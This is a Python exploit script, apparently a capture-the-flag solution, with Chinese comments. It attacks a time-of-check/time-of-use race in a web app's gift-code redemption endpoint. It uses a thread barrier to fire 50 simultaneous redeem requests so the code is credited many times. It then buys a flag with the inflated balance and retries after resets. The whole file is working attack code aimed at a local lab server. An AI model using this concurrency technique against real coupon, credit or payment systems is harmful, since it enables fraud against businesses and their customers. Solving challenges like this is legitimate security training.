#!/usr/bin/env python3
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
# 34-logic-race-condition  TOCTOU 竞态利用
# 思路：/redeem 中 read -> check -> sleep(0.15) -> read -> write 非原子。
# barrier 对齐 N 个线程同时通过 used 检查，sleep 期间累加 +10。
# 注意：/reset 会把余额一起清零、跨轮无法累加，所以必须“每轮先 reset 再抢”，
#       在单轮 burst 里凑够 >=100；不够就整轮重置重抢。
import threading
import re
import time
import sys
import requests
from collections import Counter


def classify(x):
    s = x.replace(" ", "")
    if '"ok":true'  in s: return "ok"
    if '"ok":false' in s: return "already_used"
    if x.startswith("ERR:"): return x            # ERR:ConnectionError 等
    if not x:             return "empty/reset"   # 服务端没回响应就断了（容器抽风）
    if "500" in x or "Internal Server Error" in x: return "500"
    return "other"

BASE = os.environ.get("GKD_URL") or ("http://127.0.0.1:35023")
N    = 50          # 并发线程数；过低累加不够，过高 worker 易丢响应
CODE = "GIFT10"

def get_balance():
    html = requests.get(BASE + "/", timeout=10).text
    m = re.search(r"¥<b>(\d+)</b>", html)
    return int(m.group(1)) if m else -1

def reset():
    # 不跟随 302，避免 keep-alive 复用旧连接
    requests.get(BASE + "/reset", allow_redirects=False, timeout=10)

def race(n=N):
    bar = threading.Barrier(n)
    lock = threading.Lock()
    out  = []

    def worker():
        bar.wait()                           # 所有线程在此对齐
        try:
            r = requests.post(BASE + "/redeem",
                              data={"code": CODE},
                              headers={"Connection": "close"},
                              timeout=20)
            with lock: out.append(r.text)
        except Exception as e:
            with lock: out.append(f"ERR:{type(e).__name__}")

    ts = [threading.Thread(target=worker) for _ in range(n)]
    t0 = time.time()
    for t in ts: t.start()
    for t in ts: t.join()
    tally = Counter(classify(x) for x in out)
    print(f"[*] race N={n} elapsed={time.time()-t0:.2f}s ok={tally['ok']}/{n}  {dict(tally)}")
    return out

def buy():
    return requests.post(BASE + "/buy", timeout=10).text

def main():
    global N
    if len(sys.argv) > 1 and sys.argv[1].isdigit():
        N = int(sys.argv[1])

    # 每轮必须先 reset（清掉 used 且余额归零），再在一轮 burst 里抢够 >=100；
    # 不够就整轮 reset 重抢（独立尝试），最多 MAX_ATTEMPTS 次。
    MAX_ATTEMPTS = 8
    bal = 0
    for attempt in range(1, MAX_ATTEMPTS + 1):
        print(f"\n=== attempt {attempt}/{MAX_ATTEMPTS}  (reset -> race N={N}) ===")
        reset(); time.sleep(0.6)
        if get_balance() < 0:
            print("[x] server unreachable (balance=-1), abort"); sys.exit(1)
        race(N)
        time.sleep(0.6)
        bal = get_balance()
        print(f"[*] balance = {bal}")
        if bal >= 100:
            break
        print("[!] <100：used 已被占用，本轮作废，重新 reset 再抢")

    if bal < 100:
        print(f"[x] {MAX_ATTEMPTS} 轮都没抢够 100（最后 {bal}）。加大并发再试：python3 main.py {N*2}")
        sys.exit(1)

    print("[*] /buy ->")
    resp = buy()
    print(resp)
    m = re.search(r'TOGOGO-flag\{[^}]+\}|flag\{[^}]+\}', resp)
    if m:
        print(f"\n[+] FLAG = {m.group(0)}")
    else:
        print("[!] flag not found in response")

if __name__ == "__main__":
    main()
